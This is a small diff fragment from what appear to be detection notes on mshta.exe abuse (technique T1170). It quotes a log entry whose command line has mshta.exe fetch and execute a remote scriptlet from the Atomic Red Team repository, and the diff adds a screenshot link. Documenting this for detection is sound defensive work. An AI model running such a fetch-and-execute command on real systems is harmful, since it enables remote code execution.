@@ -17,6 +17,7 @@ mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redc
 host="DESKTOP-EHTEINI" ParentCommandLine="mshta.exe  javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();"
 
 
+![mshta](https://user-images.githubusercontent.com/36422282/55601319-5d7b8900-572e-11e9-9d96-5d4aefac4bc8.png)
 
 
 
